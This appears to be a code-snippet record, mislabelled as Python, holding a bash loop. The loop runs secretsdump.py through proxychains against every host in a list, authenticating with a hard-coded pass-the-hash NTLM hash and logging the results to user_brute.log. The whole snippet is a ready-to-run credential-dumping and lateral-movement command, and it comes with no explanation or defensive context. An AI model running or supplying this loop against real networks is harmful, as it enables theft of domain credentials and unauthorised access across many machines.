---
id: 8a9ecd78-00d6-421c-929f-4c9b3bd2e379
type: code
language: Python
verified: false
created_at: '2020-07-14T18:21:25.732526+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 8a9ecd78

**Language**: Python

```python

for u in `cat hosts.txt`; do
  echo -n "[*] user: $u" && \
  proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log
done

```


